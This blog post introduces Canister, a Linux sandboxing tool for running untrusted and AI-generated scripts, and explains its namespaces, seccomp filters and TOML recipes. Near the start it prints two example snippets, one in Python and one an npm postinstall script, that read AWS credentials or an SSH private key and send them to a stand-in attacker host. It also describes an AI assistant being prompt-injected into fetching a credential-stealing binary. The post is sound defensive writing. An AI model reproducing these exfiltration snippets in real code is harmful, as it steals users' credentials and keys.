+++
title = "We Are Blindly Executing AI-Generated Code"
description = "AI writes code faster than we can review it. I started building Canister to explore what lightweight sandboxing for untrusted scripts could look like on Linux."
date = 2026-04-09
+++

Last week I asked an AI to write a Python script that processes CSV files. The code looked reasonable. It imported `os`, `subprocess`, and `urllib`. It worked. I shipped it.

Later I re-read it and noticed it was shelling out to `curl` to fetch a dependency at runtime -- a URL I never verified. The script also had full read access to my home directory, my SSH keys, my AWS credentials. If that `curl` target had been poisoned, everything on my machine was fair game.

This is the new normal. We generate code faster than we audit it, and we execute it with the full privileges of our user account.

## The problem is not AI. The problem is trust assumptions.

When you run `python3 script.py` or `npm install`, the process inherits everything: your filesystem, your network, your environment variables, your API tokens. This was already a bad idea with code you wrote yourself. With AI-generated code, it gets worse.

Consider what a malicious or confused script can do:

```python
# Exfiltrate credentials
import urllib.request, os
token = open(os.path.expanduser("~/.aws/credentials")).read()
urllib.request.urlopen("https://evil.example.com/collect?d=" + token)
```

```javascript
// postinstall.js -- runs automatically on npm install
const { execSync } = require("child_process");
const fs = require("fs");
const keys = fs.readFileSync(`${process.env.HOME}/.ssh/id_ed25519`, "utf8");
execSync(`curl -s https://evil.example.com/collect -d '${keys}'`);
```

Neither of these require root. Neither trigger any OS warning. Both execute with your full user permissions the moment you hit Enter.

The standard advice -- "review the code carefully" -- does not scale. A single `pip install` pulls in dozens of transitive dependencies. An `npm install` can execute hundreds of postinstall scripts. AI-generated code compounds this: the volume of code you did not write but are responsible for running has increased by an order of magnitude.

## What would "safe by default" look like?

Ideally, the sandboxed process would see an empty filesystem except for paths you explicitly allow. No network access unless you whitelist specific domains. No arbitrary binary execution. No secret environment variables leaking in. And outside the current working directory, filesystem writes discarded.

This is the question I started exploring with [Canister](https://github.com/dergraf/canister).

## The experiment

I couldn't resist tackling this over the holidays. Canister (`can`) is a Rust project exploring how far you can push lightweight, unprivileged sandboxing on Linux. The idea: combine user namespaces, mount isolation, seccomp BPF, and network namespaces into a single binary that requires no root and no container runtime.

```
$ can run --recipe recipes/python-pip.toml -- python3 untrusted_script.py
```

The script runs in a mount namespace with an ephemeral overlay filesystem. It sees only the paths declared in the recipe. It can only reach whitelisted domains. It is blocked from dangerous syscalls. The current working directory is bind-mounted writable, but everything else is either read-only or not mounted at all.

There are existing tools in this space -- Docker, Firejail, Bubblewrap, `nsjail` -- each with different tradeoffs. I was specifically interested in something that fits the AI-coding workflow: you have a script or build command from a source you don't fully trust, and you want to run it with minimal privileges, right now, without writing a Dockerfile or setting up infrastructure. Whether Canister actually hits that sweet spot is something I'm still figuring out.

### A concrete Python example

Say an AI generates a data-processing script and you want to run it with some guardrails:

```toml
# my-analysis.toml
[filesystem]
allow = ["/usr/lib", "/usr/bin", "/lib", "/tmp"]
deny  = ["/etc/shadow", "/root"]

[network]
deny_all = true

[process]
max_pids = 32
allow_execve = ["/usr/bin/python3"]
env_passthrough = ["PATH", "LANG"]
```

```
$ can run -r my-analysis.toml -- python3 analyze.py
```

The script cannot read `~/.aws/credentials` because the home directory is not mounted. It cannot phone home because the network is disabled. It cannot shell out to `curl` because `curl` is not in `allow_execve`. If it tries any of this, it fails -- loudly.

### A concrete Node.js example

Running `npm install` in an untrusted project:

```
$ can run -r node-build -- npm install
```

The `node-build` recipe whitelists `registry.npmjs.org` and a few CDN domains. The sandbox allows `node`, `npm`, and `npx` to execute. Postinstall scripts that try to reach arbitrary URLs, read your SSH keys, or exec unexpected binaries get blocked.

### Recipe composition

One design choice I find interesting is recipe composition. Canister auto-detects your package manager -- if the binary lives under `/nix/store`, the Nix recipe is composed automatically, same for Homebrew, Cargo, Snap, and Flatpak. You can also layer recipes explicitly:

```
$ can run -r nix -r elixir -- mix test
```

Multiple `-r` flags are merged left-to-right: union on allow-lists, strictest-wins on deny policies. The goal is that adding support for a new package manager is "write a TOML file" rather than "modify Rust code."

## Under the hood

Canister stacks several Linux isolation mechanisms:

1. **User namespaces** -- the sandboxed process maps to UID 0 inside but has no real host privileges.
2. **Mount namespace + pivot_root** -- ephemeral tmpfs root, only explicitly allowed paths bind-mounted read-only.
3. **PID namespace** -- the sandbox cannot see or signal host processes.
4. **Network namespace + slirp4netns** -- in filtered mode, only pre-resolved whitelisted domains are reachable.
5. **Seccomp BPF** -- default-deny syscall filter. ~170 syscalls allowed; everything else returns EPERM (or KILL_PROCESS in strict mode).
6. **Seccomp USER_NOTIF supervisor** -- intercepts `connect()`, `clone()`, `socket()`, and `execve()` to enforce argument-level policies from the parent process.
7. **Cgroups v2** -- optional memory and CPU limits.
8. **/proc hardening** -- sensitive paths masked, `/proc/sys` read-only.

The design philosophy is fail-closed: if isolation cannot be established, the sandbox refuses to start. No silent degradation unless you explicitly opt in with `--allow-degraded`. There is also a `--strict` mode intended for CI that makes all degradation fatal and switches seccomp to KILL_PROCESS.

None of this is novel individually -- these are well-known Linux primitives. The interesting part (to me) is the composition: combining them behind a simple CLI with TOML-based policies that are easy to read and share.

## An attack scenario

To make this more concrete: say you're using an AI coding assistant and it generates a build script for your project. The script includes a postinstall step that downloads a "build tool" binary from a URL the AI hallucinated or was prompt-injected into producing.

Without a sandbox: the script runs, downloads the binary, executes it. The binary reads your `~/.gitconfig` for your name and email, scans for SSH and GPG keys, grabs cloud credentials, and POSTs everything to an external server. You notice nothing. The build succeeds.

With Canister: the script starts, tries to connect to the download URL -- blocked, not in the domain whitelist. Tries to read `~/.gitconfig` -- path not mounted. Tries to exec the downloaded binary -- blocked by `allow_execve`. The sandbox logs every denied operation.

There is also a monitor mode that lets you observe what would be blocked without actually enforcing anything, which is useful for iterating on a recipe:

```
$ can run --monitor -r node-build -- npm run build
```

## Open questions

This is still early. Some things I'm actively thinking about:

- **Usability vs. security tradeoff.** The more locked down the default policy, the more often legitimate scripts break. Finding the right baseline is harder than it sounds.
- **Recipe ecosystem.** The value of composable recipes depends on whether people actually contribute and maintain them. `can init` pulls community recipes from GitHub, but that is only useful if the recipes stay current.
- **macOS.** Canister is Linux-only because it relies on user namespaces and seccomp. I do not have a good answer for macOS yet.
- **Integration with AI tools.** The natural next step would be AI coding assistants automatically running generated code inside a sandbox. That requires some cooperation from the tool side.

If any of this is interesting to you, the code is at [github.com/dergraf/canister](https://github.com/dergraf/canister). It is Apache-2.0 licensed. Issues and ideas welcome.
